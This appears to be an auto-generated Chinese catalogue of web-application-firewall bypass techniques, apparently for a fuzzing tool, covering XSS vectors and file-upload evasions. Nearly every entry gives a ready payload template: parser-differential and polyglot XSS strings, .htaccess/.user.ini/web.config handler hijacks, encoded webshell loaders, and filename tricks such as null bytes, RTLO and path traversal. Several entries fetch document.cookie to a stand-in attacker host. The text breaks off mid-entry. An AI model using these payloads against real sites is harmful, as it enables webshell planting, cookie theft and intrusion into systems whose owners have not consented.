### `xss:semantic:dom_clobber_deep` — DOM 遮蔽链

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<img id=x name=alert><form name=f><input name=x></form>` 用 id/name 遮蔽 window 属性，`window.f.x` 取到对象——无 script 无事件，纯 HTML 结构。
- **模板**：`<img id=alert><form name=f><input name=x onchange=alert(1)>`
- **来源备注**：`<img id=alert><form name=f><input name=x onchange=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:json_unicode_mismatch` — JSON 净化→HTML 渲染

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：payload 经 JSON 净化保留 `<` 等 Unicode 转义，微服务解码后渲染进 HTML 视图时转义失效——净化器上下文不感知（2025 趋势）。
- **模板**：`{"msg":"<script>alert(1)</script>"}`
- **来源备注**：`{"msg":"<script>alert(1)</script>"}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:mismatch_context` — 跨上下文净化失效

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：数据按 A 上下文（如 DB）净化、却在 B 上下文（日志面板/预览）原样渲染——sanitizer 上下文不感知是语义引擎盲区（QQ 预览 mXSS 同族）。
- **模板**：`DB 存 `<img src=x onerror=alert(1)>`、`日志面板渲染`
- **来源备注**：`DB 存 `<img src=x onerror=alert(1)>`、`日志面板渲染`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:parser_differential` — 解析器差异

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：WAF 与浏览器解析 HTML 的差异（命名空间、原始文本模式、标签容错）导致"WAF 看到无害 / 浏览器解析出 XSS"：`<svg><script>` 在 SVG 命名空间执行而 WAF 只拦顶层 `<script>`；`<scr<script>ipt>` 剥标签后重组；`<svg><use href=#x>` + `<defs><g id=x><script>` 延迟触发。
- **模板**：`<svg><script>alert(1)</script></svg>`、`<scr<script>ipt>alert(1)</script>`、`<svg><script xlink:href="data:text/javascript,alert(1)"></script>`、`<svg><use href="#x"/></svg><defs><g id="x"><script>alert(1)</script></g></defs>`、`<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>`
- **来源备注**：`<svg><script>alert(1)</script></svg>`、`<scr<script>ipt>alert(1)</script>`、`<svg><script xlink:href="data:text/javascript,alert(1)"></script>`、`<svg><use href="#x"/></svg><defs><g id="x"><script>alert(1)</script></g></defs>`、`<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:polyglot` — 多上下文 polyglot

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：一条 payload 在 HTML 内容/属性/JS 字符串/URL/CSS 多上下文同时合法，WAF 单上下文正则无法整体匹配；`//`、注释、模板语法做上下文桥接。
- **模板**：`jaVasCript:/*-/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`、`<svg/onload=javascript:alert(1)//`（无空格`、`//` 注释吞尾）`、`<svg/onload=/${//;{//alert(1)}//><Base/Href=//evil.com-->`
- **来源备注**：`jaVasCript:/*-/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`、`<svg/onload=javascript:alert(1)//`（无空格`、`//` 注释吞尾）`、`<svg/onload=/${//;{//alert(1)}//><Base/Href=//evil.com-->`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:waffled_json_dupkey` — JSON 重复键解析分歧绕过 WAF 意图识别

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在 JSON 请求体中放置重复键：WAF 的 JSON 解析器取第一个键（良性哨兵值），后端反序列化器取最后一个键（真实攻击载荷）。WAF 看到无害内容，后端执行攻击负载，载荷本身无需任何变形。WAFFLED 2025（ACSAC）对 AWS/Azure/Cloudflare/Cloud Armor/ModSec 五大 WAF 实证 557 例 JSON 绕过，属协议/解析层分歧，专门骗语义引擎的意图判定。
- **模板**：`{"q":"safe","q":"<script>alert(document.cookie)</script>"}`
- **来源备注**：`{"q":"safe","q":"<script>alert(document.cookie)</script>"}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:token:js_new_syntax` — JS 新语法 BigInt/可选链绕过语法覆盖

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：JS 新语法或草案特性（BigInt `1n`、异步生成器 for-await-of、可选链 `?.`）对旧解析器是语法错误，语义引擎语法覆盖落后于浏览器（ES6→ES10）导致放行。打 token 化/语法覆盖盲区。
- **模板**：`<script>alert(1n)</script>`、`<script>this.alert?.()</script>`、`<script>(asyncfunction*(){})['constructor']('alert(document.domain)')().next();</script>`
- **来源备注**：`<script>alert(1n)</script>`、`<script>this.alert?.()</script>`、`<script>(asyncfunction*(){})['constructor']('alert(document.domain)')().next();</script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

## 文件上传（52 条）

### `upload:config:htaccess` — .htaccess

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：上传 `.htaccess` 改变目录解析：`AddType application/x-httpd-php .jpg`。
- **模板**：`文件内容 `AddType application/x-httpd-php .jpg` 或 `SetHandler application/x-httpd-php`
- **来源备注**：`文件内容 `AddType application/x-httpd-php .jpg` 或 `SetHandler application/x-httpd-php`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:config:htaccess_php_value` — .htaccess php_value auto_prepend_file + php://filter 变体（内容编码态免杀）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在可传 .htaccess 的基础上用 php_value 系指令构造内容型绕过：`php_value auto_prepend_file "php://filter/convert.base64-decode/resource=5.png"` 让目录内每个 PHP 脚本执行时自动读取并 base64 解码 5.png——5.png 内是 base64 编码的 webshell，文件体不含任何 PHP 标签/关键字，规避内容扫描。反斜杠换行续接可把 auto_append_file/AddType 关键字跨行拆分逃过逐行过滤（`auto_append_fi\`+换行+`le`）。变体还有 php_flag engine on、AddType application/x-httpd-php .pht 映射冷门扩展。区别于 upload:config:htaccess 的基础 AddType 直映射，本手法连载荷都是编码态。
- **模板**：`php_value auto_prepend_file "php://filter/convert.base64-decode/resource=5.png"` + 5.png 内容 base64(webshell)；`AddType application/x-httpd-p\\nhp .pht`
- **来源备注**：`php_value auto_prepend_file "php://filter/convert.base64-decode/resource=5.png"` + 5.png 内容 base64(webshell)；`AddType application/x-httpd-p\\nhp .pht`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:config:user_ini` — user.ini

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`user.ini` 的 `auto_prepend_file` 让每个 PHP 文件前置包含。
- **模板**：`auto_prepend_file=shell.jpg`
- **来源备注**：`auto_prepend_file=shell.jpg`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:config:web_config` — web.config 处理器劫持（IIS）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：IIS 上传 web.config 改 handler 映射，让 .jpg 等无害扩展名走 ASP.NET 执行——.htaccess 的 Windows 对应物，WAF 若只拦 .htaccess 会漏过 web.config
- **模板**：`<configuration><system.webServer><handlers><add name='x' path='*.jpg' verb='*' type='System.Web.UI.PageHandlerFactory'/></handlers></system.webServer></configuration>`
- **来源备注**：`<configuration><system.webServer><handlers><add name='x' path='*.jpg' verb='*' type='System.Web.UI.PageHandlerFactory'/></handlers></system.webServer></configuration>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:content:dynamic_function` — 动态函数

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：<?php $f='sys'.'tem';$f('id');?> 字符串拼接函数名执行，绕过函数名关键字扫描。
- **模板**：`<?php $f='sys'.'tem';$f('id');?>`
- **来源备注**：`<?php $f='sys'.'tem';$f('id');?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:exif_metadata_xss` — EXIF 元数据 XSS

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：exiftool 把 XSS 写进图片元数据（Artist/Comment），应用渲染元数据时触发——存储型 XSS，WAF 扫描文件体时若只认图片不解析 EXIF 会漏过
- **模板**：`exiftool -Artist='"'><svg onload=alert(1)>' photo.jpg`
- **来源备注**：`exiftool -Artist='"'><svg onload=alert(1)>' photo.jpg`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:js_image_polyglot` — JPEG/JS polyglot 脚本：绕过 script-src 'self' 的存储型执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 img_polygloter 构造同时是合法 JPEG 与合法 JavaScript 的 polyglot 上传，图片校验（扩展名/MIME/尺寸）全通过；随后在 XSS 注入点用 `<script src="/uploads/[file]">` 从同源加载，绕开严格 CSP 的 script-src 'self'，JS 载荷在同源下执行窃取 cookie。
- **模板**：`img_polygloter.py jpg --payload 'fetch("https://attacker/?c="+document.cookie)' --output poly.jpg` + `<script src="/uploads/poly.jpg"></script>`
- **来源备注**：`img_polygloter.py jpg --payload 'fetch("https://attacker/?c="+document.cookie)' --output poly.jpg` + `<script src="/uploads/poly.jpg"></script>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:magic_bytes` — 魔术字节 polyglot

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：GIF89a 魔术字节 polyglot 让文件通过图片检测，实际携带 PHP 代码。
- **模板**：`内容 `GIF89a` + `<?=...?>`
- **来源备注**：`内容 `GIF89a` + `<?=...?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:phar_gif_metadata` — GIF 头伪装 phar 元数据反序列化载荷

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Phar 元数据（Manifest）以序列化数据存储，phar:// 包装器触发任意文件操作（file_exists/getimagesize/include）时自动反序列化。构造 stub 为 GIF89a 头 + `__HALT_COMPILER()` 的 phar，改名 .gif/.jpg 后通过魔数与 MIME 检测；内容扫描器只见 GIF 头，且 gzip 压缩可隐藏 `__HALT_COMPILER` 关键字。上传文件本身不含一句 php 代码，规避了基于内容的 PHP 检测。
- **模板**：`GIF89a<?php __HALT_COMPILER(); ?> + PharManifest(序列化恶意对象)`、`触发: ?filename=phar://upload/payload.gif`
- **来源备注**：`GIF89a<?php __HALT_COMPILER(); ?> + PharManifest(序列化恶意对象)`、`触发: ?filename=phar://upload/payload.gif`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:png_zip_polyglot` — PNG|ZIP 多格式 polyglot（ZIP 数据置于 PNG 之后）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：一个文件同时是合法 PNG 与合法 ZIP：PNG 解析器从文件头读取，ZIP 解析器从文件尾部读取中央目录。校验方用 getimagesize/魔数检查看到 PNG 放行；ZIP 载荷藏在 PNG 结束后被应用程序解压。typebleed 工具专门检测这类 PNG|ZIP、JPEG|ZIP polyglot 绕过。
- **模板**：`[PNG 头 + 图像数据 + PNG IEND] + [ZIP 中央目录/数据]`
- **来源备注**：`[PNG 头 + 图像数据 + PNG IEND] + [ZIP 中央目录/数据]`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:svg_stored_xss` — SVG 上传存储型 XSS 绕过 CSP/同源脚本策略

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SVG 是 XML 且浏览器原生渲染，可内嵌 `<script>`/onload 事件处理器；上传检测若只看 MIME 前缀（image/*）或只做魔数检查即放行，存储的 SVG 在同源被访问即执行脚本。绕过点在于把 SVG 当作静态图片的类型判定与浏览器实际按 active content 渲染之间的语义鸿沟，且 .jpg 后缀+image/svg+xml 内容可绕过按扩展名的策略。
- **模板**：`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)"/>`
- **来源备注**：`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)"/>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:user_ini_prepend` — .user.ini 自动加载

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`.user.ini` 的 `auto_prepend_file=1.jpg` + 图片马——不用 .htaccess，PHP-FPM 场景更通用。
- **模板**：`.user.ini` 内容 `auto_prepend_file=2.png`、`配 2.png 图片马`
- **来源备注**：`.user.ini` 内容 `auto_prepend_file=2.png`、`配 2.png 图片马`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:content:zip_method_spoof` — Zombie ZIP：谎报 Compression Method 骗过内容扫描器

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：构造 Method 字段声明为 STORED(0)、实际数据是 DEFLATE 压缩的畸形 ZIP。杀软/内容扫描器信任 Method 字段按未压缩字节扫描，只看到压缩噪声找不到特征；攻击端忽略声明按 DEFLATE 解压还原 payload。实测 VirusTotal 检出率从 55/67 降到 1/66，EICAR 可做到 0/62 全漏。
- **模板**：`zombie-zip --create --compress <shell.php> shell.phar`（生成的 ZIP 声明 Method=0，内部实为 DEFLATE）
- **来源备注**：`zombie-zip --create --compress <shell.php> shell.phar`（生成的 ZIP 声明 Method=0，内部实为 DEFLATE）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:ext:nullbyte_truncate` — 空字节截断

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`xxx.php[\0].JPG` 空字节在 C 系/老 PHP 后端截断文件名，扩展名落在 `.php`——WAF 看到 `.JPG`，后端存 `.php`。
- **模板**：`shell.php%00.jpg`、`x.php\0.png`
- **来源备注**：`shell.php%00.jpg`、`x.php\0.png`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:extension:alt_php` — 冷门 PHP 扩展名族

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：.pht/.phtml/.phar/.pgif/.php3/.php5 等替代扩展名被 Apache/PHP 当脚本执行，WAF 扩展名黑名单通常只拦 .php
- **模板**：`.pht`、`.phtml`、`.phar`、`.pgif`、`.php5`
- **来源备注**：`.pht`、`.phtml`、`.phar`、`.pgif`、`.php5`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:extension:case_ext` — 大小写扩展名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell.PHP 大小写扩展名绕过只匹配小写 .php 的 WAF。
- **模板**：`shell.PHP`、`shell.Php`、`shell.pHp5`
- **来源备注**：`shell.PHP`、`shell.Php`、`shell.pHp5`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:extension:double_extension` — 双扩展名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell.php.php 双扩展名，依赖后端对多扩展名的执行判定与 WAF 取末个扩展名的差异。
- **模板**：`shell.php.php`、`shell.phtml.php`
- **来源备注**：`shell.php.php`、`shell.phtml.php`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:extension:multi_extension` — 多级扩展名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell.php.jpg 多级扩展名，WAF 看末个 .jpg 放行，后端按首个可执行扩展名执行。
- **模板**：`shell.php.jpg`、`shell.php.png`、`x.php.html`
- **来源备注**：`shell.php.jpg`、`shell.php.png`、`x.php.html`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:extension:trailing_dot` — 尾点/尾空格

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell.php. 尾点/尾空格，Windows/老 PHP 存储时剥除尾点得到 .php。
- **模板**：`shell.php.`、`shell.php`、`shell.php%00`
- **来源备注**：`shell.php.`、`shell.php`、`shell.php%00`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:filename:backslash_confusion` — 文件名内反斜杠混淆扩展名（1.j\s\p）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在文件名中插入反斜杠（`1.j\s\p`）使 WAF 正则无法匹配到 .php/.jsp 等扩展名模式，而后端解析（如 PHP basename 后存储、或某类 handler）会拼出可执行文件。OWASP CRS 在 4.6.0 明确新增对该手法的拦截（Backslash 检测），说明此前反斜杠文件名可绕过 CRS 上传规则。
- **模板**：`filename="1.j\s\p"`、`filename="shell.p\h\p"`
- **来源备注**：`filename="1.j\s\p"`、`filename="shell.p\h\p"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:filename:crlf_filename` — CRLF/控制字符文件名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell.php%0a 文件名注入 CRLF/控制字符，WAF 按行解析失效，后端存储时可能保留或截断。
- **模板**：`shell.php%0a`、`shell.php\r\n`、`shell.php\x00.jpg`
- **来源备注**：`shell.php%0a`、`shell.php\r\n`、`shell.php\x00.jpg`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `upload:filename:filename_star` — filename* 参数

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：RFC 5987 `filename*` 编码文件名，部分解析器与 WAF 处理不一致。
- **模板**：`filename*="UTF-8''shell.php"`
- **来源备注**：`filename*="UTF-8''shell.php"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:longname_truncate` — 超长文件名中间扩展名截断——.php 后接 .jpg 被 255 字节截掉

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Linux 文件名上限 255 字节。构造 [填充字符]+shell.php+.jpg 使总长恰好顶到上限，末尾的合法扩展名 .jpg 在存储/截断时被切掉，落盘文件实际以 .php 结尾。WAF 与服务端按末尾扩展名 .jpg 白名单放行，截断后文件可执行。同类变体：wget 抓取远程文件时把文件名截到 236 字符，A*232+.php+.gif 存成 A*232+.php。属校验层（读原始长名末尾）与文件系统层（截断）的语义差。
- **模板**：`[251 个 A]+shell.php+.jpg`（总长 255，.jpg 被截断 → 存为 .php）；wget 场景 `[232 个 A].php.gif` → 存为 .php
- **来源备注**：`[251 个 A]+shell.php+.jpg`（总长 255，.jpg 被截断 → 存为 .php）；wget 场景 `[232 个 A].php.gif` → 存为 .php
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:newline_in_header` — filename 参数内换行注入破坏 WAF 规则匹配

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在 filename 关键字与 = 之间插入 `\n`（`filename\n="shell.php"`）使 WAF 的逐行/正则规则无法命中，而后端解析器（宽容实现）把换行当作空白继续解析出 filename=shell.php。属于协议层换行逃逸，常与 CRLF 拆分组合使用。
- **模板**：`Content-Disposition: form-data; name="file"; filename\n="shell.php"`、`filename="shell.p%0ahp"`
- **来源备注**：`Content-Disposition: form-data; name="file"; filename\n="shell.php"`、`filename="shell.p%0ahp"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:ntfs_ads` — NTFS 备用数据流 ::$DATA

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Windows/IIS 上 shell.php::$DATA 被当 shell.php 处理，WAF 按文件名字符串后缀匹配漏过
- **模板**：`shell.php::$DATA`、`shell.php:Zone.Identifier`
- **来源备注**：`shell.php::$DATA`、`shell.php:Zone.Identifier`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:path_traversal_name` — filename 内路径穿越逃逸上传目录/绕过目录限制

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：上传文件名携带 `../`（含 URL 编码、双层编码、非标准编码如 `..%c0%af`、全角斜杠）时，若后端未对文件名做 basename/规范化，文件被写到 web 根目录外的可执行路径或覆盖任意文件，绕过按上传目录施加的过滤（如只允许 uploads/ 下静态后缀）。与上传过滤器组合实现 Webshell 落盘到可执行目录。
- **模板**：`filename="../../../tmp/lol.php"`、`filename="..%252f..%252f..%252fetc/passwd.jpg"`
- **来源备注**：`filename="../../../tmp/lol.php"`、`filename="..%252f..%252f..%252fetc/passwd.jpg"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:rfc2047_encode` — RFC 2047 文件名编码

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 =?UTF-8?B?...?= 编码文件名，WAF 按字面量匹配扩展名失败，Java(Commons-FileUpload) 等服务端自动解码还原 .jsp/.php
- **模板**：`filename="=?UTF-8?B?c2hlbGwucGhw?="`、`filename*="utf-8''shell.jsp"`
- **来源备注**：`filename="=?UTF-8?B?c2hlbGwucGhw?="`、`filename*="utf-8''shell.jsp"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:rtlo_override` — RTLO（U+202E）右到左覆盖伪装真实扩展名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：文件名插入 U+202E 后文本按从右到左显示：`name.%E2%80%AEphp.jpg` 显示为 `name.gpj.php`。依赖显示名/lastIndexOf('.') 提取后缀的过滤器看到 .jpg/.gpj 放行，文件系统与执行仍按真实扩展名处理。MITRE T1036.002、PayloadsAllTheThings 均收录为上传绕过与伪装向量。
- **模板**：`name.%E2%80%AEphp.jpg`（文件系统实为 name.jpg.php）
- **来源备注**：`name.%E2%80%AEphp.jpg`（文件系统实为 name.jpg.php）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:semicolon_truncate` — IIS 分号截断

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：IIS 在分号处截断文件名，shell.php;.jpg 被当 shell.php 执行，WAF 看到 .jpg 放行
- **模板**：`shell.php;.jpg`、`shell.asp;.jpg`
- **来源备注**：`shell.php;.jpg`、`shell.asp;.jpg`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:unclosed_quote` — filename 未闭合引号使解析器错配

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`filename="shell.php`（双引号未闭合）让部分 WAF/解析器把引号后的内容当作残留数据、无法正确提取扩展名，而后端 PHP/Java 对未闭合引号的处理不同，可能仍取 shell.php 或按宽容模式继续读取。Upload_Auto_Fuzz 将其列为独立绕过策略。
- **模板**：`Content-Disposition: form-data; name="file"; filename="shell.php`
- **来源备注**：`Content-Disposition: form-data; name="file"; filename="shell.php`
